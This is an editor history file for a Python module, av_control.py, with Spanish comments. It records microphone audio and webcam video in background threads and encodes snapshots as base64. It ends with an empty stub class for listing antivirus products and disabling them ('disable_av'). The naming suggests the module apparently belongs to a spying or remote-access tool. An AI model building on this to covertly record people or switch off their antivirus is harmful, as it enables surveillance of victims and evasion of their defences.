{
    "sourceFile": "src/modules/av_control.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 1,
            "patches": [
                {
                    "date": 1740264243914,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740266541125,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,293 @@\n+\"\"\"\r\n+Módulo de control de audio y vídeo.\r\n+Permite capturar audio del micrófono y video de la webcam.\r\n+\"\"\"\r\n+\r\n+import cv2\r\n+import pyaudio\r\n+import wave\r\n+import threading\r\n+import tempfile\r\n+import logging\r\n+import base64\r\n+import numpy as np\r\n+import os\r\n+from typing import Optional, Dict, Union\r\n+from datetime import datetime\r\n+\r\n+class AudioVideoCapture:\r\n+    def __init__(self):\r\n+        \"\"\"Inicializa el controlador de audio/vídeo.\"\"\"\r\n+        self.recording_audio = False\r\n+        self.recording_video = False\r\n+        self.temp_dir = tempfile.mkdtemp()\r\n+        self._setup_devices()\r\n+        \r\n+    def _setup_devices(self):\r\n+        \"\"\"Configura los dispositivos de audio y vídeo.\"\"\"\r\n+        self.audio = pyaudio.PyAudio()\r\n+        self.video_devices = []\r\n+        \r\n+        try:\r\n+            # Enumerar cámaras disponibles\r\n+            i = 0\r\n+            while True:\r\n+                cap = cv2.VideoCapture(i)\r\n+                if not cap.read()[0]:\r\n+                    break\r\n+                self.video_devices.append(i)\r\n+                cap.release()\r\n+                i += 1\r\n+        except Exception as e:\r\n+            logging.error(f\"Error enumerando dispositivos de vídeo: {e}\")\r\n+\r\n+    def start_audio_recording(self, duration: int = 30) -> Dict[str, Union[bool, str]]:\r\n+        \"\"\"\r\n+        Inicia la grabación de audio.\r\n+        \r\n+        Args:\r\n+            duration: Duración en segundos\r\n+            \r\n+        Returns:\r\n+            Dict con resultado y ruta del archivo\r\n+        \"\"\"\r\n+        if self.recording_audio:\r\n+            return {\"success\": False, \"error\": \"Ya hay una grabación en curso\"}\r\n+            \r\n+        try:\r\n+            self.recording_audio = True\r\n+            audio_file = os.path.join(self.temp_dir, f\"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav\")\r\n+            \r\n+            # Configuración de audio\r\n+            CHUNK = 1024\r\n+            FORMAT = pyaudio.paInt16\r\n+            CHANNELS = 1\r\n+            RATE = 44100\r\n+            \r\n+            stream = self.audio.open(\r\n+                format=FORMAT,\r\n+                channels=CHANNELS,\r\n+                rate=RATE,\r\n+                input=True,\r\n+                frames_per_buffer=CHUNK\r\n+            )\r\n+\r\n+            frames = []\r\n+            \r\n+            # Grabar audio en thread separado\r\n+            def record():\r\n+                try:\r\n+                    for _ in range(0, int(RATE / CHUNK * duration)):\r\n+                        if not self.recording_audio:\r\n+                            break\r\n+                        data = stream.read(CHUNK)\r\n+                        frames.append(data)\r\n+                finally:\r\n+                    stream.stop_stream()\r\n+                    stream.close()\r\n+                    \r\n+                    with wave.open(audio_file, 'wb') as wf:\r\n+                        wf.setnchannels(CHANNELS)\r\n+                        wf.setsampwidth(self.audio.get_sample_size(FORMAT))\r\n+                        wf.setframerate(RATE)\r\n+                        wf.writeframes(b''.join(frames))\r\n+                    \r\n+                    self.recording_audio = False\r\n+            \r\n+            threading.Thread(target=record, daemon=True).start()\r\n+            return {\"success\": True, \"file\": audio_file}\r\n+            \r\n+        except Exception as e:\r\n+            self.recording_audio = False\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def stop_audio_recording(self) -> Dict[str, bool]:\r\n+        \"\"\"Detiene la grabación de audio.\"\"\"\r\n+        self.recording_audio = False\r\n+        return {\"success\": True}\r\n+\r\n+    def capture_webcam_image(self, device_id: int = 0) -> Dict[str, Union[bool, str]]:\r\n+        \"\"\"\r\n+        Captura una imagen de la webcam.\r\n+        \r\n+        Args:\r\n+            device_id: ID del dispositivo de vídeo\r\n+            \r\n+        Returns:\r\n+            Dict con la imagen en base64\r\n+        \"\"\"\r\n+        try:\r\n+            cap = cv2.VideoCapture(device_id)\r\n+            if not cap.isOpened():\r\n+                return {\"success\": False, \"error\": \"No se pudo abrir la cámara\"}\r\n+                \r\n+            ret, frame = cap.read()\r\n+            if not ret:\r\n+                return {\"success\": False, \"error\": \"No se pudo capturar imagen\"}\r\n+                \r\n+            # Convertir a JPG en memoria\r\n+            ret, buffer = cv2.imencode('.jpg', frame)\r\n+            if not ret:\r\n+                return {\"success\": False, \"error\": \"Error codificando imagen\"}\r\n+                \r\n+            # Convertir a base64\r\n+            image_b64 = base64.b64encode(buffer).decode()\r\n+            \r\n+            return {\r\n+                \"success\": True,\r\n+                \"image\": f\"data:image/jpeg;base64,{image_b64}\"\r\n+            }\r\n+            \r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+        finally:\r\n+            if 'cap' in locals():\r\n+                cap.release()\r\n+\r\n+    def start_video_recording(self, duration: int = 30, device_id: int = 0) -> Dict[str, Union[bool, str]]:\r\n+        \"\"\"\r\n+        Inicia la grabación de vídeo.\r\n+        \r\n+        Args:\r\n+            duration: Duración en segundos\r\n+            device_id: ID del dispositivo de vídeo\r\n+            \r\n+        Returns:\r\n+            Dict con resultado y ruta del archivo\r\n+        \"\"\"\r\n+        if self.recording_video:\r\n+            return {\"success\": False, \"error\": \"Ya hay una grabación en curso\"}\r\n+            \r\n+        try:\r\n+            self.recording_video = True\r\n+            video_file = os.path.join(self.temp_dir, f\"video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi\")\r\n+            \r\n+            cap = cv2.VideoCapture(device_id)\r\n+            if not cap.isOpened():\r\n+                return {\"success\": False, \"error\": \"No se pudo abrir la cámara\"}\r\n+                \r\n+            # Configuración de vídeo\r\n+            fps = 20.0\r\n+            frame_width = int(cap.get(3))\r\n+            frame_height = int(cap.get(4))\r\n+            \r\n+            out = cv2.VideoWriter(\r\n+                video_file,\r\n+                cv2.VideoWriter_fourcc(*'XVID'),\r\n+                fps,\r\n+                (frame_width, frame_height)\r\n+            )\r\n+            \r\n+            def record():\r\n+                try:\r\n+                    start_time = datetime.now()\r\n+                    while self.recording_video:\r\n+                        ret, frame = cap.read()\r\n+                        if not ret:\r\n+                            break\r\n+                            \r\n+                        out.write(frame)\r\n+                        \r\n+                        # Verificar duración\r\n+                        if (datetime.now() - start_time).seconds >= duration:\r\n+                            break\r\n+                finally:\r\n+                    cap.release()\r\n+                    out.release()\r\n+                    self.recording_video = False\r\n+            \r\n+            threading.Thread(target=record, daemon=True).start()\r\n+            return {\"success\": True, \"file\": video_file}\r\n+            \r\n+        except Exception as e:\r\n+            self.recording_video = False\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def stop_video_recording(self) -> Dict[str, bool]:\r\n+        \"\"\"Detiene la grabación de vídeo.\"\"\"\r\n+        self.recording_video = False\r\n+        return {\"success\": True}\r\n+\r\n+    def get_device_info(self) -> Dict[str, list]:\r\n+        \"\"\"\r\n+        Obtiene información sobre los dispositivos disponibles.\r\n+        \r\n+        Returns:\r\n+            Dict con información de dispositivos de audio y vídeo\r\n+        \"\"\"\r\n+        try:\r\n+            audio_devices = []\r\n+            video_devices = []\r\n+            \r\n+            # Enumerar dispositivos de audio\r\n+            for i in range(self.audio.get_device_count()):\r\n+                try:\r\n+                    info = self.audio.get_device_info_by_index(i)\r\n+                    if info['maxInputChannels'] > 0:\r\n+                        audio_devices.append({\r\n+                            'index': i,\r\n+                            'name': info['name'],\r\n+                            'channels': info['maxInputChannels'],\r\n+                            'rate': info['defaultSampleRate']\r\n+                        })\r\n+                except:\r\n+                    continue\r\n+            \r\n+            # Enumerar dispositivos de vídeo\r\n+            for i in self.video_devices:\r\n+                try:\r\n+                    cap = cv2.VideoCapture(i)\r\n+                    width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)\r\n+                    height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)\r\n+                    fps = cap.get(cv2.CAP_PROP_FPS)\r\n+                    cap.release()\r\n+                    \r\n+                    video_devices.append({\r\n+                        'index': i,\r\n+                        'resolution': f\"{int(width)}x{int(height)}\",\r\n+                        'fps': round(fps, 2)\r\n+                    })\r\n+                except:\r\n+                    continue\r\n+            \r\n+            return {\r\n+                \"audio_devices\": audio_devices,\r\n+                \"video_devices\": video_devices\r\n+            }\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error obteniendo información de dispositivos: {e}\")\r\n+            return {\"audio_devices\": [], \"video_devices\": []}\r\n+\r\n+    def cleanup(self):\r\n+        \"\"\"Limpia recursos y archivos temporales.\"\"\"\r\n+        try:\r\n+            self.recording_audio = False\r\n+            self.recording_video = False\r\n+            self.audio.terminate()\r\n+            \r\n+            # Eliminar archivos temporales\r\n+            for file in os.listdir(self.temp_dir):\r\n+                try:\r\n+                    os.remove(os.path.join(self.temp_dir, file))\r\n+                except:\r\n+                    pass\r\n+            os.rmdir(self.temp_dir)\r\n+        except Exception as e:\r\n+            logging.error(f\"Error en cleanup: {e}\")\r\n+\r\n+\"\"\"\r\n+Módulo para control de antivirus\r\n+\"\"\"\r\n+\r\n+class AVControl:\r\n+    def __init__(self):\r\n+        self.av_list = []\r\n+        \r\n+    def list_av_products(self):\r\n+        \"\"\"Lista productos antivirus instalados\"\"\"\r\n+        pass\r\n+        \r\n+    def disable_av(self):\r\n+        \"\"\"Intenta deshabilitar el antivirus\"\"\"\r\n+        pass\r\n"
                }
            ],
            "date": 1740264243914,
            "name": "Commit-0",
            "content": "\"\"\"\r\nMódulo de control de audio y vídeo.\r\nPermite capturar audio del micrófono y video de la webcam.\r\n\"\"\"\r\n\r\nimport cv2\r\nimport pyaudio\r\nimport wave\r\nimport threading\r\nimport tempfile\r\nimport logging\r\nimport base64\r\nimport numpy as np\r\nimport os\r\nfrom typing import Optional, Dict, Union\r\nfrom datetime import datetime\r\n\r\nclass AudioVideoCapture:\r\n    def __init__(self):\r\n        \"\"\"Inicializa el controlador de audio/vídeo.\"\"\"\r\n        self.recording_audio = False\r\n        self.recording_video = False\r\n        self.temp_dir = tempfile.mkdtemp()\r\n        self._setup_devices()\r\n        \r\n    def _setup_devices(self):\r\n        \"\"\"Configura los dispositivos de audio y vídeo.\"\"\"\r\n        self.audio = pyaudio.PyAudio()\r\n        self.video_devices = []\r\n        \r\n        try:\r\n            # Enumerar cámaras disponibles\r\n            i = 0\r\n            while True:\r\n                cap = cv2.VideoCapture(i)\r\n                if not cap.read()[0]:\r\n                    break\r\n                self.video_devices.append(i)\r\n                cap.release()\r\n                i += 1\r\n        except Exception as e:\r\n            logging.error(f\"Error enumerando dispositivos de vídeo: {e}\")\r\n\r\n    def start_audio_recording(self, duration: int = 30) -> Dict[str, Union[bool, str]]:\r\n        \"\"\"\r\n        Inicia la grabación de audio.\r\n        \r\n        Args:\r\n            duration: Duración en segundos\r\n            \r\n        Returns:\r\n            Dict con resultado y ruta del archivo\r\n        \"\"\"\r\n        if self.recording_audio:\r\n            return {\"success\": False, \"error\": \"Ya hay una grabación en curso\"}\r\n            \r\n        try:\r\n            self.recording_audio = True\r\n            audio_file = os.path.join(self.temp_dir, f\"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav\")\r\n            \r\n            # Configuración de audio\r\n            CHUNK = 1024\r\n            FORMAT = pyaudio.paInt16\r\n            CHANNELS = 1\r\n            RATE = 44100\r\n            \r\n            stream = self.audio.open(\r\n                format=FORMAT,\r\n                channels=CHANNELS,\r\n                rate=RATE,\r\n                input=True,\r\n                frames_per_buffer=CHUNK\r\n            )\r\n\r\n            frames = []\r\n            \r\n            # Grabar audio en thread separado\r\n            def record():\r\n                try:\r\n                    for _ in range(0, int(RATE / CHUNK * duration)):\r\n                        if not self.recording_audio:\r\n                            break\r\n                        data = stream.read(CHUNK)\r\n                        frames.append(data)\r\n                finally:\r\n                    stream.stop_stream()\r\n                    stream.close()\r\n                    \r\n                    with wave.open(audio_file, 'wb') as wf:\r\n                        wf.setnchannels(CHANNELS)\r\n                        wf.setsampwidth(self.audio.get_sample_size(FORMAT))\r\n                        wf.setframerate(RATE)\r\n                        wf.writeframes(b''.join(frames))\r\n                    \r\n                    self.recording_audio = False\r\n            \r\n            threading.Thread(target=record, daemon=True).start()\r\n            return {\"success\": True, \"file\": audio_file}\r\n            \r\n        except Exception as e:\r\n            self.recording_audio = False\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def stop_audio_recording(self) -> Dict[str, bool]:\r\n        \"\"\"Detiene la grabación de audio.\"\"\"\r\n        self.recording_audio = False\r\n        return {\"success\": True}\r\n\r\n    def capture_webcam_image(self, device_id: int = 0) -> Dict[str, Union[bool, str]]:\r\n        \"\"\"\r\n        Captura una imagen de la webcam.\r\n        \r\n        Args:\r\n            device_id: ID del dispositivo de vídeo\r\n            \r\n        Returns:\r\n            Dict con la imagen en base64\r\n        \"\"\"\r\n        try:\r\n            cap = cv2.VideoCapture(device_id)\r\n            if not cap.isOpened():\r\n                return {\"success\": False, \"error\": \"No se pudo abrir la cámara\"}\r\n                \r\n            ret, frame = cap.read()\r\n            if not ret:\r\n                return {\"success\": False, \"error\": \"No se pudo capturar imagen\"}\r\n                \r\n            # Convertir a JPG en memoria\r\n            ret, buffer = cv2.imencode('.jpg', frame)\r\n            if not ret:\r\n                return {\"success\": False, \"error\": \"Error codificando imagen\"}\r\n                \r\n            # Convertir a base64\r\n            image_b64 = base64.b64encode(buffer).decode()\r\n            \r\n            return {\r\n                \"success\": True,\r\n                \"image\": f\"data:image/jpeg;base64,{image_b64}\"\r\n            }\r\n            \r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n        finally:\r\n            if 'cap' in locals():\r\n                cap.release()\r\n\r\n    def start_video_recording(self, duration: int = 30, device_id: int = 0) -> Dict[str, Union[bool, str]]:\r\n        \"\"\"\r\n        Inicia la grabación de vídeo.\r\n        \r\n        Args:\r\n            duration: Duración en segundos\r\n            device_id: ID del dispositivo de vídeo\r\n            \r\n        Returns:\r\n            Dict con resultado y ruta del archivo\r\n        \"\"\"\r\n        if self.recording_video:\r\n            return {\"success\": False, \"error\": \"Ya hay una grabación en curso\"}\r\n            \r\n        try:\r\n            self.recording_video = True\r\n            video_file = os.path.join(self.temp_dir, f\"video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi\")\r\n            \r\n            cap = cv2.VideoCapture(device_id)\r\n            if not cap.isOpened():\r\n                return {\"success\": False, \"error\": \"No se pudo abrir la cámara\"}\r\n                \r\n            # Configuración de vídeo\r\n            fps = 20.0\r\n            frame_width = int(cap.get(3))\r\n            frame_height = int(cap.get(4))\r\n            \r\n            out = cv2.VideoWriter(\r\n                video_file,\r\n                cv2.VideoWriter_fourcc(*'XVID'),\r\n                fps,\r\n                (frame_width, frame_height)\r\n            )\r\n            \r\n            def record():\r\n                try:\r\n                    start_time = datetime.now()\r\n                    while self.recording_video:\r\n                        ret, frame = cap.read()\r\n                        if not ret:\r\n                            break\r\n                            \r\n                        out.write(frame)\r\n                        \r\n                        # Verificar duración\r\n                        if (datetime.now() - start_time).seconds >= duration:\r\n                            break\r\n                finally:\r\n                    cap.release()\r\n                    out.release()\r\n                    self.recording_video = False\r\n            \r\n            threading.Thread(target=record, daemon=True).start()\r\n            return {\"success\": True, \"file\": video_file}\r\n            \r\n        except Exception as e:\r\n            self.recording_video = False\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def stop_video_recording(self) -> Dict[str, bool]:\r\n        \"\"\"Detiene la grabación de vídeo.\"\"\"\r\n        self.recording_video = False\r\n        return {\"success\": True}\r\n\r\n    def get_device_info(self) -> Dict[str, list]:\r\n        \"\"\"\r\n        Obtiene información sobre los dispositivos disponibles.\r\n        \r\n        Returns:\r\n            Dict con información de dispositivos de audio y vídeo\r\n        \"\"\"\r\n        try:\r\n            audio_devices = []\r\n            video_devices = []\r\n            \r\n            # Enumerar dispositivos de audio\r\n            for i in range(self.audio.get_device_count()):\r\n                try:\r\n                    info = self.audio.get_device_info_by_index(i)\r\n                    if info['maxInputChannels'] > 0:\r\n                        audio_devices.append({\r\n                            'index': i,\r\n                            'name': info['name'],\r\n                            'channels': info['maxInputChannels'],\r\n                            'rate': info['defaultSampleRate']\r\n                        })\r\n                except:\r\n                    continue\r\n            \r\n            # Enumerar dispositivos de vídeo\r\n            for i in self.video_devices:\r\n                try:\r\n                    cap = cv2.VideoCapture(i)\r\n                    width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)\r\n                    height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)\r\n                    fps = cap.get(cv2.CAP_PROP_FPS)\r\n                    cap.release()\r\n                    \r\n                    video_devices.append({\r\n                        'index': i,\r\n                        'resolution': f\"{int(width)}x{int(height)}\",\r\n                        'fps': round(fps, 2)\r\n                    })\r\n                except:\r\n                    continue\r\n            \r\n            return {\r\n                \"audio_devices\": audio_devices,\r\n                \"video_devices\": video_devices\r\n            }\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error obteniendo información de dispositivos: {e}\")\r\n            return {\"audio_devices\": [], \"video_devices\": []}\r\n\r\n    def cleanup(self):\r\n        \"\"\"Limpia recursos y archivos temporales.\"\"\"\r\n        try:\r\n            self.recording_audio = False\r\n            self.recording_video = False\r\n            self.audio.terminate()\r\n            \r\n            # Eliminar archivos temporales\r\n            for file in os.listdir(self.temp_dir):\r\n                try:\r\n                    os.remove(os.path.join(self.temp_dir, file))\r\n                except:\r\n                    pass\r\n            os.rmdir(self.temp_dir)\r\n        except Exception as e:\r\n            logging.error(f\"Error en cleanup: {e}\")\r\n"
        }
    ]
}